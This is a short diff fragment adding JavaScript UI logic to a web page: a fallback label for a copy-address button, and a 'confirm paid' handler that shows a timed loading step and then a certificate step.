+        copyAddrBtn.textContent = 'Select & copy manually';
+      }
+    });
+
+    confirmPaidBtn.addEventListener('click', () => {
+      confirmPaidBtn.disabled = true;
+      showStep(loadingCert);
+      slowLoad(LOAD_CERT_MS, () => {
+        showStep(stepCertificate);
+        confirmPaidBtn.disabled = false;
+      });
     });
   </script>
 </body>
